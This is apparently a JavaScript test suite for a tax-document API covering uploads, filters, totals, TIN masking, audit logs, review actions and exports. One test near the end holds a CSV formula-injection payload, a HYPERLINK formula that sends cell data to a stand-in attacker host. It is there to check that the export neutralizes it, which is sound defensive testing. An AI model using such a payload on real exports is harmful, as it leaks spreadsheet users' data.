import request from "supertest";
import { app } from "../src/app.js";
import { TaxDocument } from "../src/models/index.js";
import { authHeader, resetDb, signup } from "./testUtils.js";

beforeEach(resetDb);

async function makeTaxDoc(orgId, overrides = {}) {
  return TaxDocument.create({
    orgId,
    originalFilename: "1099.pdf",
    storagePath: "/tmp/does-not-matter.pdf",
    contentType: "application/pdf",
    status: "extracted",
    documentType: "1099-NEC",
    taxYear: 2024,
    payerName: "Brightline Systems Inc.",
    recipientName: "Northwind Consulting LLC",
    recipientTinLast4: "6789",
    amount: 84250,
    federalTaxWithheld: 0,
    overallConfidence: 0.95,
    ...overrides,
  });
}

async function orgId(token) {
  const res = await request(app).get("/api/auth/me").set(authHeader(token));
  return res.body.org_id;
}

test("upload rejects unsupported file type", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/tax-documents/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("hello"), { filename: "notes.txt", contentType: "text/plain" });
  expect(res.status).toBe(422);
});

test("upload requires a file", async () => {
  const token = await signup(app, request);
  const res = await request(app).post("/api/tax-documents/upload").set(authHeader(token));
  expect(res.status).toBe(422);
});

test("upload creates a queued tax document and lists it", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/tax-documents/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("%PDF-1.4 fake"), { filename: "1099.pdf", contentType: "application/pdf" });
  expect(res.status).toBe(201);
  expect(res.body.status).toBe("queued");

  const listRes = await request(app).get("/api/tax-documents").set(authHeader(token));
  expect(listRes.status).toBe(200);
  expect(listRes.body.items.map((i) => i.id)).toContain(res.body.id);
});

test("list can filter by status and search by payer name", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeTaxDoc(org, { status: "needs_review", payerName: "Acme Payments Inc." });
  await makeTaxDoc(org, { status: "approved", payerName: "Beta Holdings LLC" });

  const filtered = await request(app).get("/api/tax-documents?status=approved").set(authHeader(token));
  expect(filtered.body.items).toHaveLength(1);
  expect(filtered.body.items[0].payer_name).toBe("Beta Holdings LLC");

  const searched = await request(app).get("/api/tax-documents?q=acme").set(authHeader(token));
  expect(searched.body.items).toHaveLength(1);
  expect(searched.body.items[0].payer_name).toBe("Acme Payments Inc.");
});

describe("tax_year filter", () => {
  test("narrows the list to one year", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    const current = await makeTaxDoc(org, { taxYear: 2024, payerName: "This Year Co" });
    await makeTaxDoc(org, { taxYear: 2023, payerName: "Last Year Co" });

    const res = await request(app).get("/api/tax-documents?tax_year=2024").set(authHeader(token));
    expect(res.status).toBe(200);
    expect(res.body.items.map((i) => i.id)).toEqual([current.id]);
  });

  test("offers every year the org has, newest first, regardless of the active filter", async () => {
    const token = await signup(app, request);
    const org = await orgId(token);
    await makeTaxDoc(org, { taxYear: 2023 });
    await makeTaxDoc(org, { taxYear: 2024 });
    await makeTaxDoc(org, { taxYear: 2022 });
    await makeTaxDoc(org, { taxYear: null }); // an unread form shouldn't add a null year

    const res = await request(app).get("/api/tax-documents?tax_year=2023").set(authHeader(token));
    expect(res.body.tax_years).toEqual([2024, 2023, 2022]);
  });
});

test("missing_tin filter surfaces only forms with no recipient TIN", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const noTin = await makeTaxDoc(org, { recipientTinLast4: "", payerName: "No TIN Co" });
  await makeTaxDoc(org, { recipientTinLast4: "6789", payerName: "Has TIN Co" });

  const res = await request(app).get("/api/tax-documents?missing_tin=true").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.items.map((i) => i.id)).toEqual([noTin.id]);
});

test("document_type filter narrows to one form", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeTaxDoc(org, { documentType: "1099-NEC" });
  const w2 = await makeTaxDoc(org, { documentType: "W-2" });

  const res = await request(app).get("/api/tax-documents?document_type=W-2").set(authHeader(token));
  expect(res.body.items.map((i) => i.id)).toEqual([w2.id]);
});

// The totals are the reason the year filter exists: "what do I report for
// 2024" has to be answered over the whole filtered set, not just page one.
test("totals cover the whole filtered set, not just the current page", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeTaxDoc(org, { taxYear: 2024, amount: 1000, federalTaxWithheld: 100 });
  await makeTaxDoc(org, { taxYear: 2024, amount: 250.5, federalTaxWithheld: 0, recipientTinLast4: "" });
  await makeTaxDoc(org, { taxYear: 2023, amount: 9999, federalTaxWithheld: 999 });

  const res = await request(app).get("/api/tax-documents?tax_year=2024&page_size=1").set(authHeader(token));
  expect(res.body.items).toHaveLength(1); // one page
  expect(res.body.total).toBe(2);
  expect(res.body.totals.amount).toBe(1250.5); // both rows
  expect(res.body.totals.federal_tax_withheld).toBe(100);
  expect(res.body.totals.missing_tin).toBe(1);
  expect(res.body.totals.by_document_type["1099-NEC"]).toBe(2);
});

test("tax document correction writes audit log", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org);

  let res = await request(app)
    .patch(`/api/tax-documents/${doc.id}`)
    .set(authHeader(token))
    .send({ payer_name: "Brightline Systems Corrected Inc." });
  expect(res.status).toBe(200);
  expect(res.body.payer_name).toBe("Brightline Systems Corrected Inc.");

  res = await request(app).get(`/api/tax-documents/${doc.id}/audit-log`).set(authHeader(token));
  expect(res.body.map((e) => e.action)).toContain("human_correction");
});

test("correcting a field that doesn't actually change the value writes no audit log entry", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org);

  await request(app)
    .patch(`/api/tax-documents/${doc.id}`)
    .set(authHeader(token))
    .send({ payer_name: doc.payerName });

  const res = await request(app).get(`/api/tax-documents/${doc.id}/audit-log`).set(authHeader(token));
  expect(res.body.map((e) => e.action)).not.toContain("human_correction");
});

// A reviewer types what's printed on the form. The whole reason the column
// exists in last-four form is defeated if the correction path lets a full
// SSN straight through.
test("a full TIN typed into a correction is narrowed to its last four digits", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org, { recipientTinLast4: "" });

  const res = await request(app)
    .patch(`/api/tax-documents/${doc.id}`)
    .set(authHeader(token))
    .send({ recipient_tin_last4: "123-45-6789" });
  expect(res.status).toBe(200);
  expect(res.body.recipient_tin_last4).toBe("6789");

  await doc.reload();
  expect(doc.recipientTinLast4).toBe("6789");

  // ...including in the audit trail, which is the other place it would
  // otherwise be written down in full.
  const auditRes = await request(app).get(`/api/tax-documents/${doc.id}/audit-log`).set(authHeader(token));
  expect(JSON.stringify(auditRes.body)).not.toContain("123-45-6789");
});

// Silently storing "" would be indistinguishable from "this form has no
// TIN on it", quietly moving the document into the missing-TIN queue.
test("a TIN too short to narrow is rejected rather than silently blanked", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org, { recipientTinLast4: "6789" });

  const res = await request(app)
    .patch(`/api/tax-documents/${doc.id}`)
    .set(authHeader(token))
    .send({ recipient_tin_last4: "987" });
  expect(res.status).toBe(422);
  expect(res.body.detail).toMatch(/last four digits/i);

  await doc.reload();
  expect(doc.recipientTinLast4).toBe("6789"); // untouched
});

test("clearing the TIN is allowed -- that's how 'the form shows none' is recorded", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org, { recipientTinLast4: "6789" });

  const res = await request(app)
    .patch(`/api/tax-documents/${doc.id}`)
    .set(authHeader(token))
    .send({ recipient_tin_last4: "" });
  expect(res.status).toBe(200);
  expect(res.body.recipient_tin_last4).toBe("");

  const listRes = await request(app).get("/api/tax-documents?missing_tin=true").set(authHeader(token));
  expect(listRes.body.items.map((i) => i.id)).toContain(doc.id);
});

test("an unknown document type is rejected rather than stored", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org);

  const res = await request(app)
    .patch(`/api/tax-documents/${doc.id}`)
    .set(authHeader(token))
    .send({ document_type: "Form 42" });
  expect(res.status).toBe(422);
});

test("approve tax document", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org);

  const res = await request(app).post(`/api/tax-documents/${doc.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("approved");
});

test("cannot approve a tax document still queued or processing", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org, { status: "queued" });

  const res = await request(app).post(`/api/tax-documents/${doc.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(409);
});

test("reject tax document has no status restriction", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org, { status: "approved" });

  const res = await request(app).post(`/api/tax-documents/${doc.id}/reject`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("rejected");
});

test("retrying a failed tax document re-queues it and clears the error message", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org, { status: "failed", errorMessage: "OCR failed: boom" });

  const res = await request(app).post(`/api/tax-documents/${doc.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("queued");
  expect(res.body.error_message).toBe("");

  const auditRes = await request(app).get(`/api/tax-documents/${doc.id}/audit-log`).set(authHeader(token));
  expect(auditRes.body.map((e) => e.action)).toContain("retry_requested");
});

test("cannot retry an already-approved tax document", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org, { status: "approved" });

  const res = await request(app).post(`/api/tax-documents/${doc.id}/retry`).set(authHeader(token));
  expect(res.status).toBe(409);

  await doc.reload();
  expect(doc.status).toBe("approved"); // untouched
});

test("deleting a tax document removes it from the list and detail views", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org);

  const res = await request(app).delete(`/api/tax-documents/${doc.id}`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.ok).toBe(true);

  const listRes = await request(app).get("/api/tax-documents").set(authHeader(token));
  expect(listRes.body.items.map((i) => i.id)).not.toContain(doc.id);

  const detailRes = await request(app).get(`/api/tax-documents/${doc.id}`).set(authHeader(token));
  expect(detailRes.status).toBe(404);
});

test("deleting the same tax document twice, or one that never existed, 404s", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const doc = await makeTaxDoc(org);

  await request(app).delete(`/api/tax-documents/${doc.id}`).set(authHeader(token));
  const again = await request(app).delete(`/api/tax-documents/${doc.id}`).set(authHeader(token));
  expect(again.status).toBe(404);

  const bogus = await request(app).delete("/api/tax-documents/not-a-real-id").set(authHeader(token));
  expect(bogus.status).toBe(404);
});

test("one org cannot see another's tax documents", async () => {
  const tokenA = await signup(app, request, { email: "a@example.com" });
  const tokenB = await signup(app, request, { email: "b@example.com" });
  const orgA = await orgId(tokenA);
  const doc = await makeTaxDoc(orgA);

  const listRes = await request(app).get("/api/tax-documents").set(authHeader(tokenB));
  expect(listRes.body.items).toHaveLength(0);

  const detailRes = await request(app).get(`/api/tax-documents/${doc.id}`).set(authHeader(tokenB));
  expect(detailRes.status).toBe(404);
});

test("export csv", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeTaxDoc(org, { payerName: "Acme Payments Inc." });

  const res = await request(app).get("/api/export/tax-documents/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain("Acme Payments Inc.");
  expect(res.text).toContain("recipient_tin_last4");
});

test("export csv neutralizes formula-injection payloads", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeTaxDoc(org, { payerName: '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")' });

  const res = await request(app).get("/api/export/tax-documents/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain('"\'=HYPERLINK(');
  expect(res.text).not.toContain('"=HYPERLINK(');
});

test("export xlsx responds successfully", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeTaxDoc(org);

  const res = await request(app).get("/api/export/tax-documents/xlsx").set(authHeader(token));
  expect(res.status).toBe(200);
});
